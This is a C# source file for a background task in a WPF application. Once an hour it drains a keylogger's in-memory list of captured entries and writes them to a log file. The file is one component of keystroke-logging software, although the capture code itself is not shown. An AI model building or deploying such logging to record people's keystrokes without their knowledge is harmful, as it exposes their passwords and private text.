using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Threading.Tasks;
using WPF.Databases.Contexts;
using WPF.Models;
using WPF.Models.Extensions;
using WPF.Models.Interfaces;

namespace WPF.Managers.Tasks
{
    class KeyLoggerCollecterTask : IBackgroundTask, IDisposableExtended
    {
        public BackgroundWorker BackgroundWorker { get; } = new BackgroundWorker();

        public bool MustBeCollected => true;

        public bool Completed { get; set; }
        public bool IsDisposed { get; set; }

        public DBContext Context
        {
            get
            {
                return null;
            }
        }

        public void Dispose()
        {
            BackgroundWorker.DoWork -= BackgroundWorker_DoWork;
            BackgroundWorker.DoWork -= BackgroundWorker_Collect;
            IsDisposed = true;
            GC.Collect();
        }

        public void Run()
        {
            BackgroundWorker.DoWork += BackgroundWorker_DoWork;
            BackgroundWorker.RunWorkerAsync();
        }

        private void BackgroundWorker_DoWork(object sender, DoWorkEventArgs e)
        {
            DispatcherExtension.Invoke(async () =>
            {
                while (true)
                {
                    BackgroundWorker_Collect(sender, e);
                    await Task.Delay(3600000);
                }
            });
        }

        public void Collect()
        {
            BackgroundWorker.DoWork -= BackgroundWorker_DoWork;

            BackgroundWorker worker = new BackgroundWorker();
            worker.DoWork += BackgroundWorker_Collect;
            worker.RunWorkerAsync();
        }

        private void BackgroundWorker_Collect(object sender, DoWorkEventArgs e)
        {
            Completed = false;
            if (MainContext.Instance.KeyLogger.Any())
            {
                var list = new List<string>();
                foreach (var log in MainContext.Instance.KeyLogger)
                {
                    list.Add(log + Environment.NewLine);
                }
                MainContext.Instance.KeyLogger.Clear();

                LogManager.Instance.LogToFile(new LogInfoModel
                {
                    Type = Models.Enums.FileTypesEnum.KEYLOGGER,
                    Message = new MessageInfoModel(list)
                });
            }
            Completed = true;
        }
    }
}
